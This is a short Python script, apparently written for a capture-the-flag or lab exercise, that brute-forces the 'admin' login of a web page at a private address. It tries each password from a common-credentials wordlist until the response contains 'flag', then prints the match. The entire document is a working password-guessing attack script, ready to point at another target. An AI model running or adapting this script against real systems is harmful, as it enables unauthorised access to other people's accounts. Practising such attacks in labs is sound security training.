import requests

TARGET   = "http://10.11.8.1:8443/index.php"
USER     = "admin"
WORDLIST = "/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt"

def try_login(username, password):
    r = requests.get(TARGET, params={
        "page": "signin",
        "username": username,
        "password": password,
        "Login": "Login"
    }, timeout=5)
    # Adjust detection string to what the site actually returns
    return "flag" in r.text.lower(), r.text

with open(WORDLIST) as f:
    for i, line in enumerate(f):
        pwd = line.strip()
        if not pwd:
            continue
        found, body = try_login(USER, pwd)
        if found:
            print(f"\n[+] Password found: {pwd}")
            print(body[:500])
            break
        if i % 100 == 0:
            print(f"Tried {i} passwords, last: {pwd}", end="\r")
